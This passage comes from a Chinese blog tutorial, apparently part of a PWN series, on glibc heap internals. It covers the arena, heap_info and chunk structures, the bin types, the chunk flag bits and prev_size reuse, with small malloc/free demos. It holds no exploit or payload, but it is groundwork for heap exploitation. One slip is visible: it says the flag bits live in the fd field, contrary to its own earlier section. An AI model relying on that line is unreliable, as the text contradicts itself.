arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>fastbinsY数组：</strong>存储的是该领域管理的fastbins</li><li><strong>bins数组：</strong>存储的是该领域管理的smallbins，unsortedbin，largebin</li><li><strong>binmap变量：</strong>系统查看有哪些垃圾箱链中有块时，不可能去fastbinsY和箱数组一个一个的遍历通过binmap变量，采用二进制存储，将二进制位与数组的索引相对，系统查找箱链时可以。通过按位与来查询，这样更高效。虽然unsigned int的二进制位比数组总元素少，但是系统不会有那么多的bin链，不需要考虑这个问题</li></ul></blockquote><h4 id="3-heap-info"><a href="#3-heap-info" class="headerlink" title="3.heap_info"></a>3.<strong>heap_info</strong></h4><ul><li>我们知道一个线程可以包含多个堆段，这些堆段同属于一个舞台来管理。每个堆段的信息就是用这个结构体来表示的</li><li><strong>注意：</strong>这个不是存储堆块的数据，而是来解释说明这个堆段的</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr;            <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span>  <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> <span class="built_in">size</span>;              <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size;     <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                             PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>ar_ptr：</strong>此堆段归属于哪一个arnea管理</li><li><strong>prev：</strong>前一个堆段</li></ul></blockquote><h4 id="4-malloc-chunk"><a href="#4-malloc-chunk" class="headerlink" title="4.malloc_chunk"></a>4.malloc_chunk</h4><ul><li>一个堆块被分为多个块，这些块就是用这些结构体表示的，这个才是我们在glibc的正真存储堆数据信息的结构体</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"> </span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).*/</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead.*/</span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>   <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line"> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><ul><li><p>每个成员都是8字节（64位系统中），4字节（32位系统中）</p></li><li><p><strong>mchunk_prev_size：</strong>只有当该chunk的物理相邻的前一地址chunk是空闲的话，该字段在本chunk中才有用，用来记录前一个chunk 的大小 (包括chunk头)。否则，该字段为0是没有用的；但是当前一个chunk申请的大小大于前一个chunk的大小时，那么该字段可以用来给前一个chunk使用（这就是chunk的空间复用，后面文章介绍）</p></li><li><strong>mchunk_size：</strong>当前chunk的大小，chunk大小都是8字节对齐</li></ul></blockquote><p>这里我们来看一下gdb调试的界面</p><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *p;</span><br><span class="line">        p = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *H;</span><br><span class="line">    H = <span class="built_in">malloc</span>(<span class="number">64</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(H,<span class="string">"aaaaaaaaaaaaaaaa"</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">free</span>(H);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">gcc -o a.out a.c#<span class="number">64</span>位</span><br><span class="line">gcc -m32 -o b.out b.c#<span class="number">32</span>位</span><br></pre></td></tr></table></figure><p>64位</p><p><img src="/2020/12/15/%E5%A0%86/image-20201212004040135.png" alt="image-20201212004040135"></p><p>32位</p><p><img src="/2020/12/15/%E5%A0%86/image-20201212004126045.png" alt="image-20201212004126045"></p><blockquote><p><strong>当前chunk处于分配状态时：</strong></p><ul><li>fd：从fd字段开始的是用户的数据</li></ul><p><strong>当前chunk处于空闲时：</strong></p><p>因为chunk处于空闲时，会被放到bin链中，所以fd和bk用于指向自己所在bin链中前后的空闲chunk</p><ul><li>fd：指向前一个（非物理相邻）空闲的 chunk的指针（头指针）</li><li>bk：指向后一个（非物理相邻）空闲的 chunk的指针</li><li>通过fd和bk可以将空闲的chunk块加入到空闲的chunk块链表进行统一管理</li></ul><p><strong>fd_nextsize、bk_nextsize</strong></p><p>也是只有chunk空闲的时候才使用，不过其用于较大的chunk（large chunk）</p><ul><li>fd_nextsize：指向前一个与当前 chunk 大小不同的第一个空闲块，不包含bin的头指针</li><li>bk_nextsize：指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</li></ul><p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历</p></blockquote><h5 id="malloc-chunk的内存分配大小"><a href="#malloc-chunk的内存分配大小" class="headerlink" title="malloc_chunk的内存分配大小"></a>malloc_chunk的内存分配大小</h5><p><strong>最小的空间：</strong>mchunk_prev_size字段 + mchunk_size字段 + fd字段 + bk字段 所需要的空间。所以64位系统最低需要 4 * SIZE_SZ = 32字节；32位系统是16字节</p><p><strong>实际空间：</strong>malloc大小 + chunk对齐规则 + mchunk_prev_size字段 + mchunk_size字段 + 下一个chunk的mchunk_prev_size成员空间</p><p>chunk的数据结构大小的图（64位系统）</p><p><img src="/2020/12/15/%E5%A0%86/20201106174934849.jpg" alt="img"></p><h5 id="mchunk-size的标记位的复用"><a href="#mchunk-size的标记位的复用" class="headerlink" title="mchunk_size的标记位的复用"></a>mchunk_size的标记位的复用</h5><p>mchunk_size在64位系统下是8个字节，字段的最后三个bit位，复用用作了（AMP）的标记位置。后三位bit位的复用，不会影响size的数据大小</p><ul><li>A：A=0 为主分区分配，A=1 为非主分区分配，参见后面</li><li>M：M=1表示使用mmap映射区域，M=0为使用heap区域</li><li>P：P=0 表示pre_chunk空闲，mchunk_prev_size才有效</li></ul><h3 id="0x04-chunk的分类"><a href="#0x04-chunk的分类" class="headerlink" title="0x04 chunk的分类"></a>0x04 chunk的分类</h3><h4 id="1-allocated-chunk"><a href="#1-allocated-chunk" class="headerlink" title="1.allocated chunk"></a>1.allocated chunk</h4><p>当前chunk是被应用层用户所使用的</p><h4 id="2-free-chunk"><a href="#2-free-chunk" class="headerlink" title="2.free chunk"></a>2.free chunk</h4><p>当前chunk是空闲的，没有被应用层用户所使用</p><h4 id="3-top-chunk"><a href="#3-top-chunk" class="headerlink" title="3.top chunk"></a>3.<strong>top chunk</strong></h4><ul><li><strong>概念：</strong>当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk</li><li><strong>作用：</strong>该chunk并<strong>不属于任何</strong>bin，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用</li><li><strong>分配的规则：</strong>如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap</li></ul><h4 id="4-last-remainder-chunk"><a href="#4-last-remainder-chunk" class="headerlink" title="4.last remainder chunk"></a>4.last remainder chunk</h4><ul><li><strong>它是怎么产生的：</strong>当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，<strong>再将该新的chunk变成新的last remainder chunk</strong></li><li><strong>它的作用是什么：</strong>此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性</li></ul><h3 id="0x05-bins分类"><a href="#0x05-bins分类" class="headerlink" title="0x05 bins分类"></a>0x05 bins分类</h3><blockquote><ul><li>bin是一个由struct chunk结构体组成的链表</li><li>前面介绍过，不同的chunk根据特点不同分为不同的chunk，为了将这些chunk进行分类的管理，glibc采用了bin链这种方式管理不同的chunk</li><li>不同的bin链是由arena管理的</li><li>bin链中的chunk均为free chunk</li></ul></blockquote><h4 id="1-bin的malloc-state"><a href="#1-bin的malloc-state" class="headerlink" title="1.bin的malloc_state"></a>1.bin的malloc_state</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>fastbinY数组：</strong>大小为10。记录的是fast bin链</li><li><strong>bins数组：</strong>大小为129。记录的是unsorted bin（1）、small bin（2~63）、large bin链（64~126）</li></ul><h4 id="2-fastbin"><a href="#2-fastbin" class="headerlink" title="2.fastbin"></a>2.fastbin</h4><p><strong>概念：</strong>chunk的大小在32字节到128字节（0x20~0x80）的chunk称为“fast chunk（大小不是malloc时的大小，而是在内存中struct malloc_chunk的大小，包含前2个成员）</p><ul><li>fast bin链表的个数为10个</li><li><strong>不会对free chunk进行合并：</strong>鉴于设计fast bin的初衷就是进行快速的小内存分配和释放，因此系统将属于<strong>fast bin的chunk的PREV_INUSE位总是设置为1</strong>，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜</li><li>LIFO</li></ul><blockquote><h3 id="fastbinsY数组存储fastbins的规则："><a href="#fastbinsY数组存储fastbins的规则：" class="headerlink" title="fastbinsY数组存储fastbins的规则："></a>fastbinsY数组存储fastbins的规则：</h3><ul><li>每个fast bin链表都是单链表（使用fd指针）。因此，fast bin中无论是添加还是移除fast chunk，都是对“链表尾”进行操作，而不会对某个中间的fast chunk进行操作</li><li>单个fastbin链表中的chunk大小都是相同的，各个fastbin链表中的chunk大小是不同的</li></ul><p><img src="/2020/12/15/%E5%A0%86/2019072416485849.png" alt="img"></p></blockquote><h4 id="3-unsorted-bin"><a href="#3-unsorted-bin" class="headerlink" title="3.unsorted bin"></a>3.unsorted bin</h4><p>当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。在堆管理器的unsorted bin 不为空时，<strong>用户申请非fast bin大小的内存</strong>会先从unsorted bin中查找，如果找到符合该申请大小要求的chunk，则直接分配或分割该chunk。</p><ul><li>unsorted bin的个数： 1个</li><li>unsorted bin是一个由free chunks组成的循环双链表</li><li>在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中</li><li>unsortedbin采用的遍历顺序是FIFO</li></ul><p><img src="file://C:\Users\86138\Music\hexo\source\_posts\PWN学习\image-20201119163232880.png?lastModify=1607780072" alt="image-20201119163232880"></p><h4 id="4-small-bin"><a href="#4-small-bin" class="headerlink" title="4.small bin"></a>4.small bin</h4><p><strong>概念</strong>：小于1024字节（0x400）的chunk称之为small chunk，small bin就是用于管理small chunk的</p><ul><li>small bin链表的个数为62个</li><li>FIFO</li><li><strong>循环双向链表</strong>，就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢</li></ul><blockquote><p><strong>Small bin链表</strong></p><ul><li>每个smallbin也是一个由对应free chunk组成的循环双链表</li><li><strong>small bin采用FIFO(先入先出)算法：</strong>内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk</li><li>单个smallbin链表中的chunk大小都是相同的，各个smallbin链表中的chunk大小是不同的，跟fastbinsY数组存储fastbin链的原理是相同的</li></ul><p><img src="/2020/12/15/%E5%A0%86/201907300808254.png" alt="img"></p></blockquote><h4 id="5-large-bin"><a href="#5-large-bin" class="headerlink" title="5.large bin"></a>5.large bin</h4><p><strong>概念：</strong>大于等于1024字节（0x400）的chunk称之为large chunk，large bin就是用于管理这些largechunk的</p><ul><li>large bin链表的个数为63个，被分为6组</li><li>largechunk使用fd_nextsize、bk_nextsize连接起来的</li></ul><blockquote><h3 id="Large-Bin链表"><a href="#Large-Bin链表" class="headerlink" title="Large Bin链表"></a>Large Bin链表</h3><ul><li>同一个largebin中每个chunk的大小可以不一样，这些chunk根据一定的范围存储在一个larbin链表中</li><li>large chunk可以添加、删除在large bin的任何一个位置</li><li><strong>在这63个largebins中：</strong>第一组的32个largebin链<strong>依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。</strong>第二组的16个largebin链<strong>依次以512字节步长为间隔；</strong>第三组的8个largebin链<strong>以步长4096为间隔；</strong>第四组的4个largebin链<strong>以32768字节为间隔；</strong>第五组的2个largebin链<strong>以262144字节为间隔；</strong>最后一组**的largebin链中的chunk大小无限制</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190730154304263.png" alt="img"></p></blockquote><p><img src="/2020/12/15/%E5%A0%86/20190724174830502.png" alt="img"></p><h3 id="0x06-堆的调用流程"><a href="#0x06-堆的调用流程" class="headerlink" title="0x06 堆的调用流程"></a>0x06 堆的调用流程</h3><p><img src="/2020/12/15/%E5%A0%86/20190722153928310.png" alt="img"></p><ul><li><h4 id="当应用程序“第一次”使用malloc函数申请动态内存时，glibc库会向内核申请一块非常大的动态内存，这块动态内存会比malloc申请的大小大很多"><a href="#当应用程序“第一次”使用malloc函数申请动态内存时，glibc库会向内核申请一块非常大的动态内存，这块动态内存会比malloc申请的大小大很多" class="headerlink" title="当应用程序“第一次”使用malloc函数申请动态内存时，glibc库会向内核申请一块非常大的动态内存，这块动态内存会比malloc申请的大小大很多"></a>当应用程序<strong>“第一次”</strong>使用malloc函数申请动态内存时，glibc库会向内核申请一块非常大的动态内存，这块动态内存会比malloc申请的大小大很多</h4></li><li><p>glibc申请到这块大的内存之后，根据malloc需要的大小，然后切割相应的大小给应用程序malloc函数使用</p></li><li><p>当应用层free之后，会将刚才使用到的动态内存返回给glibc，但是返回的内存不是返回给top chunk，而是由bins链管理</p></li><li><p>当程序再次malloc时，会从刚才申请的很大的动态内存去取，不会再去向内核申请内存</p></li><li><p>只有当第一次申请的动态内存使用完时，glibc才会再次通过brk/mmap系统调用向内核去要内存</p></li></ul><h3 id="0x07-chunk的标志位"><a href="#0x07-chunk的标志位" class="headerlink" title="0x07 chunk的标志位"></a>0x07 chunk的标志位</h3><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li><strong>NON_MAIN_ARENA：</strong>记录当前 chunk 是否不属于主线程</li><li><strong>IS_MAPPED：</strong>记录当前chunk是否是由mmap分配的</li><li><strong>PREV_INUSE：</strong>如果前面一个chunk处于分配状态，那么此位为1。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个chunk 的size 的P位为0时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并</li></ul><h4 id="2-实现"><a href="#2-实现" class="headerlink" title="2.实现"></a>2.实现</h4><ul><li><strong>在64位系统中为16字节对齐</strong>，<strong>在32位的系统中为8字节对齐</strong>。因此在64位系统中，struct malloc_chunk结构体的大小的最后4个位数是没有被使用的，32位系统中，最后3个位数是没有被使用的。</li></ul><p><img src="/2020/12/15/%E5%A0%86/2019072217303470.png" alt="img"></p><ul><li>所以，glibc用struct malloc_chunk结构体的fd成员的最后3个比特位来表示当前chunk处于什么状态。只需要将fd成员相应的比特位置为1，就可以代表当前chunk处于什么状态</li></ul><h4 id="3-PREV-INUSE位导致的chunk合并"><a href="#3-PREV-INUSE位导致的chunk合并" class="headerlink" title="3.PREV_INUSE位导致的chunk合并"></a>3.PREV_INUSE位导致的chunk合并</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = prev_size (p);                   <span class="comment">//1</span></span><br><span class="line">        <span class="built_in">size</span> += prevsize;                           <span class="comment">//2</span></span><br><span class="line">        p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize)); <span class="comment">//3</span></span><br><span class="line">        unlink(av, p, bck, fwd);                    <span class="comment">//4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>首先使用prev_inuse宏定义判断p的PREV_INUSE位是否为0</li><li>如果PREV_INUSE位为0，那么prev_inuse宏返回0，if条件为1，进入if语句体中</li><li>1.通过recv_size函数得到前面要合并的chunk的大小</li><li>2.将自己的大小与前面的presize相加得到合并后的chunk的大小</li><li>3.将p的指针向前移动，移动到前面那个chunk的开头处</li><li>4.unlink是将两个要合并的chunk各自从原来的bin链上面断下来，然后进行合并</li></ul><h4 id="4-fast-chunk的PREV-INUSE"><a href="#4-fast-chunk的PREV-INUSE" class="headerlink" title="4.fast chunk的PREV_INUSE"></a>4.fast chunk的PREV_INUSE</h4><ul><li>①无论fastchunk前面的chunk是否处于分配状态，PREV_INUSE始终为1。因为系统不希望fastchunk与前面的chunk之间进行合并</li><li>②不论当前的fastchunk是否处于分配状态，该chunk后面的chunk的PREV_INUSE位一定为1，也是为了防止后面的chunk与fastchunk合并</li></ul><h4 id="5-演示"><a href="#5-演示" class="headerlink" title="5.演示"></a>5.演示</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x70</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//为了达到演示效果，防止合并后的chunk与top chunk合并</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他用处</span></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">    <span class="built_in">free</span>(p2);   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到正好分配了3块</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214183532647.png" alt="image-20201214183532647"></p><p>看一下内存地址</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214183701946.png" alt="image-20201214183701946"></p><p>当我们释放一个之后</p><p>这里版本较高  淦 我先去找个虚拟机</p><p>可以看到是加到tcache中</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214183930779.png" alt="image-20201214183930779"></p><hr><p>弄了一晚上 我又回来了</p><p>释放第一个</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214221400402.png" alt="image-20201214221400402"></p><p>释放两个</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214221458119.png" alt="image-20201214221458119"></p><h3 id="0x08-chunk的mchunk-prev-size成员的空间复用"><a href="#0x08-chunk的mchunk-prev-size成员的空间复用" class="headerlink" title="0x08 chunk的mchunk_prev_size成员的空间复用"></a>0x08 chunk的mchunk_prev_size成员的空间复用</h3><h4 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h4><ul><li>①如果本chunk前面一个chunk处于空闲状态，那么mchunk_prev_size成员才有用，此时用来记录前一个chunk的大小</li><li>②如果本chunk前面一个chunk处于使用状态，那么mchunk_prev_size成员对于本chunk来说是不使用的</li></ul><h4 id="2-实现-1"><a href="#2-实现-1" class="headerlink" title="2.实现"></a>2.实现</h4><ul><li>当前一个chunk申请的数据空间申请的大小对16取余后，如果多出来的大小小于等于8字节，那么这个多出来的大小就放入下一个chunk的mchunk_prev_size中存储</li><li>否则，如果多出来的大小大于8字节，那么前一个chunk就不使用下一个chunk的mchunk_prev_size成员</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190724195005380.png" alt="img"></p><h4 id="3-演示"><a href="#3-演示" class="headerlink" title="3.演示"></a>3.演示</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x108</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他用处</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>0x108模0x10之后还有8 说明是占用了下一个chunk的pre_size</p><p>64位16字节对齐 0x100(分配)+0x10(头)+0x1(P)</p></blockquote><p><img src="/2020/12/15/%E5%A0%86/image-20201214190713309.png" alt="image-20201214190713309"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x109</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他用处</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span 